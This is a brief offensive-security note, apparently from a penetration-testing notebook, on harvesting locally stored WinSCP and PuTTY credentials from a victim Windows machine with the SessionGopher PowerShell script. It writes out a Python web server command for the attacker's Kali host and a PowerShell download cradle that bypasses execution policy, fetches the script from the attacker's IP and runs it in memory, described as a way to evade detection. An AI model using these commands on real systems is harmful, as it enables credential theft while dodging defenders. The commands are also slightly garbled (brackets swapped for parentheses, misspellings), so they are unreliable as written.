# r - Obtaining Stored Credentials with SessionGopher

### SessionGopher

This is a powershell script that we can execute on the target system to help us gather credentials that are stored locally by applications such as: WinSCP, Putty etc.

We can use a Powershell download craddle to download and execute the script on the victim machine, doing it this way reduces our footprint, and will execute the entire process within  the memory of the powersshell process, which can help us evade detection mechanisms.

On our kali, we setup a webserver with python. `python -m SimpleHTTPServer 80` .

On the victim cmd prompt session, we execute the powershell download craddle. `powershell.exe -nop -ep bypass -C iex <New-Object Net.Webclient>.DownloadString<'http://kaliIP/sessionGopher.ps1'>; Invoke-sessionGopher` - dumps all the gathered credentials.

You can use the `-Thorough` option at the end of the cmd also, this could take longer time to dump.
